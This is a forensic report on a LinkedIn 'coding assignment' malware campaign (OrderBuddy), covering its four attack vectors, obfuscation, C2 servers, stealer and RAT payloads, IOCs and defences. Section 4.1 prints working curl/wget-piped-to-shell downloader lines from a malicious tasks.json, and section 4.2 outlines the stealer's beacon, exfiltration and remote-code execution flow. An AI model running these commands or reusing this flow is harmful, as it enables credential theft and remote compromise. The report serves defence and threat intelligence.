# Forensic Report: OrderBuddy LinkedIn Malware Campaign

**Campaign ID:** `40abc1fa2901`  
**Classification:** TLP:CLEAR  
**Date:** February 19 – 28, 2026  
**Author:** Leviticus-Triage  
**Status:** Fully deobfuscated and documented  
**Severity:** CRITICAL — C2 infrastructure active at time of analysis

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Incident Overview](#2-incident-overview)
3. [Sandbox Environment](#3-sandbox-environment)
4. [Attack Vector Analysis](#4-attack-vector-analysis)
5. [Obfuscation Techniques](#5-obfuscation-techniques)
6. [C2 Infrastructure](#6-c2-infrastructure)
7. [Payload Analysis](#7-payload-analysis)
8. [Exfiltration Behavior](#8-exfiltration-behavior)
9. [Social Engineering Infrastructure](#9-social-engineering-infrastructure)
10. [Dynamic Analysis Results (Phase 3)](#10-dynamic-analysis-results-phase-3)
11. [IOC Summary](#11-ioc-summary)
12. [MITRE ATT&CK Mapping](#12-mitre-attck-mapping)
13. [Infection Check Results](#13-infection-check-results)
14. [Assessment and Recommendations](#14-assessment-and-recommendations)

---

## 1. Executive Summary

A colleague received a fake coding assignment via LinkedIn, delivered as a ZIP archive (`orderbuddy-main.zip`). The archive contained a sophisticated multi-stage infostealer / RAT with **4 independent attack vectors** and complex, multi-layered obfuscation.

The malware was fully reverse-engineered in an isolated Docker sandbox. **No code was executed on any production system** during Phase 1–2 (static analysis). In Phase 3, the malware was executed in a sandboxed container with live C2 contact, revealing a previously unknown active C2 server.

| Metric | Value |
|--------|-------|
| Files scanned | 577 (529 text, 48 binary, 31 images) |
| Findings | 367 total (2 CRITICAL, 15 HIGH, 350 MEDIUM) |
| Attack vectors | 4 independent |
| Obfuscation layers | 5 |
| C2 servers | 3 (triple fallback chain) |
| Downloaded payloads | 4 (stealer, exfiltrator, RAT, reverse shell) |
| Platforms targeted | Windows, macOS, Linux |
| Sample SHA256 | `2ac11f7302ea0e35e7626fb2bc4f4b68c047313c0fc5cc5681a850cf1b164047` |

---

## 2. Incident Overview

| Attribute | Detail |
|-----------|--------|
| Platform | LinkedIn |
| Fake profile | `linkedin.com/in/kendall-mareth-lopez-diaz-3a5437365` |
| Method | "Coding assignment" ZIP archive |
| Target audience | Software developers |
| Date received | February 2026 |
| Malware type | Multi-stage infostealer / RAT |
| Attribution | Lazarus Group / DPRK — "Operation Dream Job" |
| Confirmed by | BSI/CERT-Bund, CSBW, LKA |

---

## 3. Sandbox Environment

### Phase 1–2: Static Analysis (Network-Isolated)

```
Docker container:
  - network_mode: none (no internet)
  - read-only mounts for samples
  - Capability drop (no-new-privileges)
  - YARA rules and automated analysis scripts
  - Custom deobfuscation tooling
```

### Phase 3: Dynamic Analysis (Live C2 Contact)

```
┌─────────────────────────────────────────────────────┐
│ HOST (Linux 6.17, Ubuntu)                           │
│ ┌─────────────────────────────────────────────────┐ │
│ │ Docker: phase3-analysis-live                    │ │
│ │ ├── tshark (full PCAP capture, 132 MB)          │ │
│ │ ├── asciinema (shell session recording)         │ │
│ │ ├── inotifywait (filesystem monitoring)         │ │
│ │ └── Malware: orderbuddy-main/src/api            │ │
│ └─────────────────────────────────────────────────┘ │
│ HexStrike MCP (Nmap, Nuclei, forensic tools)        │
└─────────────────────────────────────────────────────┘

Duration: 21 minutes (1,270 seconds), 64,139 frames captured
```

---

## 4. Attack Vector Analysis

### 4.1 Vector 1: `.vscode/tasks.json` — Auto-Execution

**Severity: CRITICAL** — Triggers automatically when opening the project folder in VS Code or Cursor. No user click required.

```json
{
  "runOptions": { "runOn": "folderOpen" },
  "presentation": { "reveal": "never", "echo": false, "close": true }
}
```

Shell commands are hidden behind **208 whitespace characters**, disguised as a "StakingGame" blockchain deployment config with fake authors ("Juliette Clarke — Lead Engineer", "James Nodin — CTO") and 80+ lines of fake configuration.

| OS | Payload |
|----|---------|
| macOS | `curl 'https://gurucooldown.short.gy/ryGnMe8m' -L \| sh` |
| Linux | `wget -qO- 'https://gurucooldown.short.gy/ryGnMe8l' -L \| sh` |
| Windows | `curl https://gurucooldown.short.gy/ryGnMe8w -L \| cmd` |

Redirect chain: `gurucooldown.short.gy` → 301 → `alanservice.vercel.app`

### 4.2 Vector 2: `webpack.config.js` — Build-Time Infostealer

**Severity: CRITICAL** — Triggers during `npm run build`, `npm start`, or `npm run dev`.

Fully deobfuscated module imports:

```javascript
e = require('os')
n = require('fs')
s = require('request')           // HTTP client
a = require('path')
o = require('node:process')
i = require('child_process').exec
```

Deobfuscated execution flow:

1. **Beacon** to C2 Primary (`http://147.124.202.225:1244`), fallback to `http://38.92.47.157:1244`
2. **Recon**: `hostname()`, `homedir()`, `platform()`, `userInfo()`, `argv`
3. **Exfiltrate**: `POST /keys` with FormData (`ts`, `type`, `hid`, `ss`, `cc`)
4. **Download**: `GET /j/<id>` → `~/.vscode/test.js`
5. **Install**: `cd ~/.vscode && npm i --silent`
6. **Execute**: `node ~/.vscode/test.js` (windowsHide: true)
7. **Persist**: `setInterval` every 615,968 ms (~10.3 minutes), max 3 retries
8. **Stage 2**: Fetch `jsonkeeper.com/b/QWY20` → `eval(content)`

### 4.3 Vector 3: `settings.json` — Hidden Command Injection

Manipulates VS Code settings to hide malicious content:
- `editor.wordWrap: "off"` — prevents visibility of commands after whitespace
- `editor.formatOnSave: false` — prevents auto-formatting from revealing hidden code
- `editor.minimap.enabled: false` — removes visual indicator of suspicious content

### 4.4 Vector 4: `.env.example` — Credential Harvesting

Contains real MongoDB credentials (`mongodb+srv://ananth:***@watercooler-o1c-dev`) designed to lure developers into connecting to attacker-controlled database infrastructure.

---

## 5. Obfuscation Techniques

The webpack payload uses 5 distinct obfuscation layers, all of which were fully broken:

| # | Technique | Detail |
|---|-----------|--------|
| 1 | String-Array-Rotation | 109 fragments, **60 shifts** required (checksum: `0x92692`) |
| 2 | Lookup aliasing | `as = at = au = av = aw = a1` (all point to the same function) |
| 3 | `c()` decoder | `input.slice(1)` → Base64 decode → UTF-8 |
| 4 | XOR encryption | Key: `[0x70, 0xA0, 0x89, 0x48]` |
| 5 | Anti-debug | Console trap via recursive `toString()` |

### Variable Resolution Table

| Obfuscated | Resolved | Purpose |
|------------|----------|---------|
| `e` | `os` | System information |
| `n` | `fs` | File system access |
| `s` | `request` | HTTP client |
| `i` | `child_process.exec` | Shell command execution |
| `W` | `/j/` | Payload download path |
| `z` | `test.js` | Downloaded payload filename |
| `p` | `.vscode` | Persistence directory |

---

## 6. C2 Infrastructure

### 6.1 Triple Fallback Chain

All three C2 IPs belong to **AS397423 (Tier.Net Technologies LLC)**:

| IP | Location | Function | Status |
|----|----------|----------|--------|
| `147.124.202.225:1244` | New York, US | Primary C2 | Offline (RST) |
| `38.92.47.157:1244` | Dallas, US | Fallback / Config | Active (HTTP 200) |
| `66.235.175.117:1244` | US | **Operational C2** | **Active — serving payloads** |

### 6.2 Config Server Decoding

The fallback C2 (`38.92.47.157`) responds to `GET /s/40abc1fa2901` with:

```
Raw:     ZT3NjYuMjM1LjE3NS4xMTcscnlHbk1lOA==
Valid:   NjYuMjM1LjE3NS4xMTcscnlHbk1lOA==
Decoded: 66.235.175.117,ryGnMe8
```

The malware extracts the active C2 IP and victim ID (`ryGnMe8`).

### 6.3 Nmap Scan Results (66.235.175.117)

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21 | open | **FTP** | pyftpdlib 1.0.0+ |
| 22 | open | SSH | tcpwrapped |
| 80 | open | HTTP | tcpwrapped |
| 443 | open | HTTPS | tcpwrapped |
| **1244** | **open** | **HTTP** | **Node.js Express** |

### 6.4 C2 Endpoint Enumeration

Live probe results during dynamic analysis:

| Endpoint | Method | HTTP | Content |
|----------|--------|------|---------|
| `/s/40abc1fa2901` | GET | 200 | Campaign config (Base64) |
| `/keys` | POST | 200 | Exfiltration endpoint |
| `/uploads` | POST | 200 | File exfiltration endpoint |
| `/j/ryGnMe8` | GET | 200 | test.js — credential stealer (20.9 KB) |
| `/z/ryGnMe8` | GET | 200 | p.js — file exfiltrator (10.5 KB) |
| `/o/ryGnMe8` | GET | 200 | njs_ryGnMe8.js — SSH/FTP RAT (27.4 KB) |
| `/cli/ryGnMe8` | GET | 200 | main_ryGnMe8.py — Python reverse shell (8.3 KB) |
| `/p` | GET | 200 | package.json — malware dependencies (327 B) |

---

## 7. Payload Analysis

### 7.1 test.js — Browser Credential Stealer

| Attribute | Value |
|-----------|-------|
| SHA256 | `d273e7fc22daa42d8cb20b833c52c0cddca1a967891c9bab4573d3a6a4b925d7` |
| Size | 20,971 bytes |
| Obfuscation | String-Array-Rotation, XOR `[0x30, 0xD0, 0x59, 0x18]` |
| C2 URL | Base64 `NjYuMjM1LjE3NS4xMTc=` → `66.235.175.117` |
| Target browsers | Chrome, Edge, Opera, Brave |
| Stolen data | Login Data, Cookies, History, Extensions |
| Platforms | Windows (AppData), Linux (~/.config), macOS |
| Exfiltration | `POST /keys` (FormData: ts, type, hid, ss, cc) |
| Persistence | `setInterval(callback, 615968)` — ~10.3 minutes |

Iterates over up to 200 browser profiles per browser, copies `Login Data` and `Cookies` SQLite databases to temp directories, and exfiltrates them via HTTP POST.

### 7.2 p.js — File Exfiltrator

| Attribute | Value |
|-----------|-------|
| SHA256 | `4b154b8e35e4cbb3f9851b503b8245bfec601b00330690ef3d2a66bf42c4077b` |
| Size | 10,560 bytes |
| Target files | `.env`, `*.js`, `*.json`, `*.key`, `*.pem`, `*.sqlite`, `*.db`, `*.py`, `*.p12`, `*.pfx`, `*.keystore` |
| Search | Linux: `find` over home directory; Windows: drives C:–I: |
| Exclusions | `node_modules`, `.git`, binaries > 100 MB |

### 7.3 njs_ryGnMe8.js — SSH/FTP Remote Access Trojan

| Attribute | Value |
|-----------|-------|
| SHA256 | `8efb64fb702476ff55e6ebf5be38ec0b53eec0d9e456695099a149c8810dac7d` |
| Size | 27,415 bytes |
| Modules | `basic-ftp`, `net` (Socket), `child_process`, `crypto` |
| Functions | `ssh_cmd`, `ssh_upload`, `ssh_kill`, `ssh_env`, `storbin`, `uploadF`, `get_file` |
| Connection | Persistent TCP socket to C2 |
| GeoIP | Queries `ip-api.com` for victim geolocation |

This module was **not present in the static analysis** — it is only downloaded at runtime from the C2. It provides the full remote access capability, using the C2's FTP server (pyftpdlib on port 21) for data exfiltration.

### 7.4 main_ryGnMe8.py — Python Reverse Shell

| Attribute | Value |
|-----------|-------|
| SHA256 | `7ddff976b79ef4010a2d1e14938bbd33b3749febe39c8757df987d8cf54acd3c` |
| Size | 3,380 bytes (decoded) |
| Encryption | Base85 + XOR (key: `_wb[1:9]`, 8 bytes) |
| Inner payload | `exec(zlib.decompress(b64decode(data[::-1])))` |
| Status | Outer layer decoded; inner payload uses additional protection (invalid zlib header `2e 51 1c fb`) |

### 7.5 C2-Delivered Dependencies

```json
{
  "dependencies": {
    "ajv": "^8.17.1",
    "axios": "^1.12.2",
    "basic-ftp": "^5.0.5",
    "child_process": "^1.0.2",
    "plist": "^3.1.0",
    "ps-node": "^0.1.6",
    "request": "^2.88.2",
    "crypto": "^1.0.1",
    "unzipper": "^0.12.3"
  }
}
```

The inclusion of `basic-ftp`, `plist` (macOS property lists), and `ps-node` (process enumeration) are strong indicators for cross-platform malware with FTP exfiltration capability.

---

## 8. Exfiltration Behavior

### 8.1 POST /keys — System Reconnaissance

| Field | Value | Meaning |
|-------|-------|---------|
| `ts` | 1772233979269 | Unix timestamp (ms) |
| `type` | ryGnMe8 | Victim ID (campaign-specific) |
| `hid` | 0293d7d55ada | Hostname (Docker container ID in sandbox) |
| `ss` | oqr | Abbreviated system info |
| `cc` | `5A1/sandbox/.../webpack` | Triggering command path |

### 8.2 Exfiltration Channels

The campaign uses three independent exfiltration channels:

| Channel | Port | Protocol | Data |
|---------|------|----------|------|
| HTTP POST /keys | 1244 | HTTP | System recon, timestamps |
| HTTP POST /uploads | 1244 | HTTP | Browser credentials, files |
| FTP | 21 | FTP (pyftpdlib) | Large file transfers |
| SSH/SCP | 22 | SSH | Remote access, file transfer |

---

## 9. Social Engineering Infrastructure

### 9.1 orderbuddyapp.com (Fake Product Site)

| Attribute | Value |
|-----------|-------|
| IP | 13.107.213.45, 13.107.246.45 (Azure CDN/Front Door) |
| DNS | Azure DNS (`ns1-04.azure-dns.com`) |
| SSL | DigiCert/GeoTrust (Nov 2025 – Apr 2026) |
| Email | MXroute (mxrouting.net), SPF: mxlogin.com |
| Tech stack | React SPA (Vite), 610 B HTML + 152 KB JS bundle |
| Last-Modified | September 24, 2025 |
| Contains malware | **No** — clean React bundle |

Minimal single-page application serving as a facade. No API, no backend, no login functionality.

### 9.2 orderbuddyshop.com (Fake Marketing Site)

| Attribute | Value |
|-----------|-------|
| IP | 82.25.73.196 (Hostinger, São Paulo, Brazil) |
| SSL | Let's Encrypt R12 (Jan 2026 – Apr 2026) |
| Email | `info@orderbuddyshop.com` (Hostinger MX) |
| Tech stack | Next.js SSR, 23 KB, professional SEO |
| LinkedIn | `linkedin.com/company/orderbuddyshop` |
| SOA serial | 2026021901 (updated on analysis day) |
| Fake stats | 10K+ restaurants, 500K+ orders, 98% satisfaction |
| Contains malware | **No** — pure marketing facade |

SEO-optimized with meta tags, OpenGraph tags, sitemap, robots.txt, manifest.json. Actively maintained.

### 9.3 Infrastructure Connections

- **Azure link:** `orderbuddyapp.com` on Azure (AS8075) — same provider as C2 `4.202.147.122`
- **Brazil focus:** `orderbuddyshop.com` (Hostinger BR) + C2 (Azure Campinas BR)
- **Campaign investment:** 2 domains, 2 hosting providers, 2 tech stacks, LinkedIn company page, email, DigiCert SSL

---

## 10. Dynamic Analysis Results (Phase 3)

### 10.1 C2 Communication Sequence

| Time | Event |
|------|-------|
| T+0s (23:10:49 UTC) | `npm run build` triggers webpack |
| T+0s | GET `147.124.202.225:1244/s/40abc1fa2901` → **RST** (offline) |
| T+1s | GET `38.92.47.157:1244/s/40abc1fa2901` → **Config** (66.235.175.117) |
| T+2s | POST `66.235.175.117:1244/keys` → **Exfiltration** (system recon) |
| T+3s | GET `/j/ryGnMe8` → test.js (20.9 KB) |
| T+4s | GET `/p` → package.json |
| T+5s | `npm install --silent` in `~/.vscode` |
| T+8s | `node test.js` started |
| T+10s | GET `/z/ryGnMe8`, `/o/ryGnMe8`, `/cli/ryGnMe8` |
| T+15s | POST `/uploads` — 1st exfiltration (browser data) |
| T+649s | **2nd beacon** (setInterval 615,968 ms) |
| T+650s | POST `/keys` (2nd recon), POST `/uploads` (2nd exfil) |
| T+1270s | PCAP recording ended (21 min) |

### 10.2 Extracted TCP Streams

27 TCP streams extracted from PCAP, mapped to C2 IPs:

| IP | Streams | Content |
|----|---------|---------|
| 147.124.202.225 | 39, 68, 81 | RST (3× 322 B each) |
| 38.92.47.157 | 41, 69, 82 | Config (3× 585 B each) |
| 66.235.175.117 | 42–93 (21 streams) | POST /keys, GET /j,z,o,cli, POST /uploads |

### 10.3 Key Discovery: Previously Unknown C2

The static analysis identified only two C2 IPs. Dynamic analysis revealed a **third operational C2** (`66.235.175.117`) that was actively serving payloads. This IP was not extractable through static analysis alone — it is delivered via Base64-encoded config from the fallback server.

---

## 11. IOC Summary

See [`iocs/`](../iocs/) for machine-readable formats (CSV, STIX 2.1).

### Network IOCs

| Type | Value | ASN | Function | Phase |
|------|-------|-----|----------|-------|
| C2 Active | `66.235.175.117:1244` | AS397423 | Payload delivery, exfiltration | 3 (NEW) |
| C2 FTP | `66.235.175.117:21` | AS397423 | FTP exfiltration (pyftpdlib) | 3 (NEW) |
| C2 SSH | `66.235.175.117:22` | AS397423 | Remote access | 3 (NEW) |
| C2 Primary | `147.124.202.225:1244` | AS397423 | Primary C2 (offline) | 1–2 |
| C2 Fallback | `38.92.47.157:1244` | AS397423 | Config server | 1–2 |
| C2 Alt | `4.202.147.122` | AS8075 | Statically identified | 1–2 |
| Downloader | `gurucooldown.short.gy` | — | Shell downloader | 1–2 |
| Redirect | `alanservice.vercel.app` | Vercel | Payload server | 1–2 |
| Stage 2 | `jsonkeeper.com/b/QWY20` | — | eval() payload | 1–2 |

### File IOCs

| File | SHA256 |
|------|--------|
| orderbuddy-main.zip | `2ac11f7302ea0e35e7626fb2bc4f4b68c047313c0fc5cc5681a850cf1b164047` |
| test.js (stealer) | `d273e7fc22daa42d8cb20b833c52c0cddca1a967891c9bab4573d3a6a4b925d7` |
| p.js (exfiltrator) | `4b154b8e35e4cbb3f9851b503b8245bfec601b00330690ef3d2a66bf42c4077b` |
| njs_ryGnMe8.js (RAT) | `8efb64fb702476ff55e6ebf5be38ec0b53eec0d9e456695099a149c8810dac7d` |
| main_ryGnMe8.py | `7ddff976b79ef4010a2d1e14938bbd33b3749febe39c8757df987d8cf54acd3c` |

### Cryptographic IOCs

| Component | Method | Key/Value |
|-----------|--------|-----------|
| webpack.config.js | XOR | `[0x70, 0xA0, 0x89, 0x48]` |
| test.js | XOR | `[0x30, 0xD0, 0x59, 0x18]` |
| C2 URL (Base64) | btoa | `NjYuMjM1LjE3NS4xMTc=` → 66.235.175.117 |
| C2 URL (fragment) | Rotation | `E3NS4xMTc=NjYuMjM1Lj` |
| main_ryGnMe8.py | Base85 + XOR | 8-byte key from `_wb[1:9]` |

---

## 12. MITRE ATT&CK Mapping

See [`mitre-attack/MAPPING.md`](../mitre-attack/MAPPING.md) for the full mapping with evidence chains.

| Tactic | Techniques |
|--------|------------|
| Initial Access | T1566.001, T1566.002 |
| Execution | T1204.002, T1059.006, T1059.007 |
| Persistence | T1053.005 |
| Defense Evasion | T1027, T1027.010, T1036, T1497 |
| Discovery | T1082, T1083 |
| Collection | T1005, T1552.001, T1552.004 |
| Command & Control | T1071.001, T1105 |
| Exfiltration | T1041, T1048 |
| Resource Development | T1583.001, T1585.001 |

---

## 13. Infection Check Results

A comprehensive 17-point check was performed on the potentially affected workstation:

| # | Check | Result |
|---|-------|--------|
| 1 | Malware artifacts in `~/.vscode/` | Clean |
| 2 | VS Code workspace history | Clean |
| 3 | Running processes (C2 IPs, ryGnMe8) | Clean |
| 4 | Network connections to C2 | Clean |
| 5 | DNS resolutions | Clean |
| 6 | Shell history | Clean |
| 7 | npm cache | Clean |
| 8 | Browser history (Safari, Chrome, Brave, Edge) | Clean |
| 9 | Persistence (Launch Agents, Crontab, systemd) | Clean |
| 10 | SSH keys | Clean |
| 11 | Suspicious files in `/tmp` | Clean |
| 12 | Firewall logs | Clean |
| 13 | Node.js traces | Clean |
| 14 | VS Code / Cursor storage | Clean |
| 15 | macOS quarantine flags | Clean |
| 16 | Keychain access | Clean |
| 17 | TCC database | Clean |

**Result: 0 critical findings. System was not compromised.**

---

## 14. Assessment and Recommendations

### Overall Assessment

The OrderBuddy campaign represents a **highly sophisticated, active threat**. The combination of:

1. **Professional social engineering** (LinkedIn, 2 fake websites, company page, DigiCert SSL)
2. **4 independent attack vectors** (tasks.json, webpack, settings.json, .env)
3. **5-layer obfuscation** (string rotation, XOR, Base64, Base85, zlib)
4. **Multi-tier C2 infrastructure** with fallback chain across single ASN
5. **Multi-protocol exfiltration** (HTTP, FTP, SSH)
6. **Cross-platform targeting** (Windows, Linux, macOS)

...is consistent with **"Operation Dream Job"** (Lazarus Group / DPRK), as confirmed by BSI, CSBW, and LKA.

### Immediate Actions

| # | Action | Priority |
|---|--------|----------|
| 1 | Distribute IOCs (66.235.175.117, hashes) to SIEM/EDR | CRITICAL |
| 2 | Block C2 IPs at network perimeter | CRITICAL |
| 3 | Deploy YARA rules to endpoint security | HIGH |
| 4 | Report to BSI/CERT-Bund with Phase 3 findings | CRITICAL |
| 5 | Submit hashes to VirusTotal, AbuseIPDB, OTX | HIGH |
| 6 | Inform developer teams about LinkedIn campaign | HIGH |

### Long-Term Recommendations

1. Enforce VS Code setting `task.allowAutomaticTasks: "never"` organization-wide
2. Implement npm lifecycle hook review process (preinstall, postinstall)
3. Network monitoring for HTTP traffic on non-standard ports (especially 1244)
4. Developer awareness training for LinkedIn-based supply chain attacks
5. Regular scanning of developer workstations for `.vscode/test.js` artifacts

---

*This report was produced as part of an authorized security investigation. All malware samples were analyzed exclusively in isolated environments. Identified IOCs are intended for distribution to relevant authorities and the security community.*
